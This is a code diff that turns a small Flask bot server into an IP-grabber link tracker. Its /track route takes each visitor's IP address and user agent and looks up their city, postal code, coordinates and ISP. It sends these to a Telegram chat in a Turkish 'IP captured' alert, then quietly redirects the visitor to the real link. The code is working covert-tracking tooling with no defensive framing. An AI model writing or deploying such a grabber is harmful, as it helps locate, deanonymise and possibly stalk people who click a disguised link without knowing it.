@@ -1,10 +1,98 @@
-from flask import Flask
+from flask import Flask, redirect, request, abort
+import os
+import requests as _req
+import html as _html
+import tracking_store
 
 app = Flask(__name__)
+
+TELEGRAM_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '')
+
 
 @app.route('/')
 def home():
     return "AZRxGUARD Bot is running!"
 
-if __name__ == "__main__":
+
+@app.route('/track/<token>')
+def track(token):
+    row = tracking_store.get(token)
+    if not row:
+        abort(404)
+    dest_url, chat_id = row
+
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr or '')
+    if ',' in ip:
+        ip = ip.split(',')[0].strip()
+    ua = request.headers.get('User-Agent', '—')[:300]
+
+    geo = {}
+    try:
+        r = _req.get(
+            f'http://ip-api.com/json/{ip}'
+            f'?fields=status,country,countryCode,regionName,city,zip,'
+            f'timezone,lat,lon,isp,org,mobile,proxy,hosting,query',
+            timeout=5
+        )
+        if r.status_code == 200:
+            geo = r.json()
+    except Exception:
+        pass
+
+    lat = geo.get('lat', '')
+    lon = geo.get('lon', '')
+    harita = f'https://maps.google.com/?q={lat},{lon}' if lat and lon else None
+    proxy   = geo.get('proxy', False)
+    hosting = geo.get('hosting', False)
+    mobile  = geo.get('mobile', False)
+
+    if proxy:     tip = '🔴 Proxy/VPN'
+    elif hosting: tip = '🟠 Hosting/Sunucu'
+    elif mobile:  tip = '📱 Mobil Hat'
+    else:         tip = '✅ Normal Kullanıcı'
+
+    def e(v):
+        return _html.escape(str(v) if v else '—')
+
+    msg = (
+        f"🎯 <b>LİNK AÇILDI — IP YAKALANDI</b>\n"
+        f"━━━━━━━━━━━━━━━━━━\n\n"
+        f"🌐 <b>IP Adresi:</b> <code>{e(geo.get('query', ip))}</code>\n"
+        f"🏳️ <b>Ülke:</b> {e(geo.get('country'))} ({e(geo.get('countryCode'))})\n"
+        f"🏙️ <b>Şehir / Bölge:</b> {e(geo.get('city'))} / {e(geo.get('regionName'))}\n"
+        f"📮 <b>Posta Kodu:</b> {e(geo.get('zip'))}\n"
+        f"🕐 <b>Saat Dilimi:</b> <code>{e(geo.get('timezone'))}</code>\n"
+        f"📡 <b>Koordinat:</b> <code>{lat}, {lon}</code>\n"
+    )
+    if harita:
+        msg += f'🗺️ <a href="{harita}">Google Maps\'te Gör</a>\n'
+    msg += (
+        f"\n"
+        f"📶 <b>ISP:</b> {e(geo.get('isp'))}\n"
+        f"🏛️ <b>Org:</b> {e(geo.get('org'))}\n"
+        f"📱 <b>Mobil Hat:</b> {'✅ Evet' if mobile else '❌ Hayır'}\n"
+        f"🛡️ <b>IP Türü:</b> {tip}\n\n"
+        f"🖥️ <b>User Agent:</b>\n<code>{e(ua)}</code>\n\n"
+        f"🔗 <b>Hedef Link:</b> {e(dest_url)}"
+    )
+
+    if TELEGRAM_TOKEN and chat_id:
+        try:
+            _req.post(
+                f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage',
+                json={
+                    'chat_id': chat_id,
+                    'text': msg,
+                    'parse_mode': 'HTML',
+                    'disable_web_page_preview': True
+                },
+                timeout=5
+            )
+        except Exception:
+            pass
+
+    return redirect(dest_url, code=302)
+
+
+if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
